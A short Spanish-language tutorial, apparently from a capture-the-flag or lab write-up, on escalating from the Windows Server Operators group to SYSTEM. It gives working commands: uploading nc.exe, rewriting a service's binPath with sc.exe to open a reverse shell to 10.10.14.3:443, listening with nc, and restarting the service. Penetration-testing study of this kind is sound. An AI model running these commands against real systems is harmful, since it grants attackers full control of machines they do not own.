# Privilege Escalation: Server Operator Group

## Descripción del grupo

El grupo **Server Operators** es una categoría especial de usuarios en entornos Windows que tiene acceso a comandos y configuraciones avanzadas del sistema. Aunque no son administradores completos, sus privilegios les permiten:

- Supervisar el rendimiento del servidor  
- Gestionar la seguridad del sistema  
- Instalar actualizaciones de software  
- Crear y mantener cuentas de usuario  
- Realizar tareas de mantenimiento

Este grupo suele estar destinado a roles de soporte técnico o administración de servidores.

## Vector de escalada

Ser miembro del grupo **Server Operators** no es una vulnerabilidad por sí misma. Sin embargo, los privilegios que otorga pueden ser aprovechados por un atacante para **escalar a SYSTEM**, especialmente si se combinan con servicios mal configurados.

Este vector es frecuentemente ignorado, pero puede ser **letal** si se explota correctamente.

---

## Explotación práctica

### 1. Subida del binario

Subimos el binario de Netcat (`nc.exe`) a la máquina Windows comprometida. Por ejemplo:

```plaintext
C:\Users\svc-printer\Documents\nc.exe
```

### 2. Enumeración de servicios

Listamos los servicios del sistema (`services`) para identificar alguno que:

- Se ejecute con privilegios elevados  
- Sea modificable por el usuario actual  

No todos serán editables, pero conviene probar varios.

### 3. Modificación del binPath

Elegimos un servicio vulnerable (por ejemplo, `VMTools`) y modificamos su ruta de ejecución (`binPath`) para que lance Netcat con una reverse shell:

```bash
sc.exe config VMTools binPath= "C:\Users\svc-printer\Documents\nc.exe -e cmd 10.10.14.3 443"
```

### 4. Escucha en local

Nos ponemos a la escucha en nuestra máquina atacante:

```bash
nc -lvnp 443
```

### 5. Reinicio del servicio

Parar e iniciar el servicio para ejecutar el nuevo binario:

```bash
sc.exe stop VMTools
sc.exe start VMTools
```

### Resultado

Recibimos una **reverse shell como NT AUTHORITY\SYSTEM**, logrando la escalada de privilegios.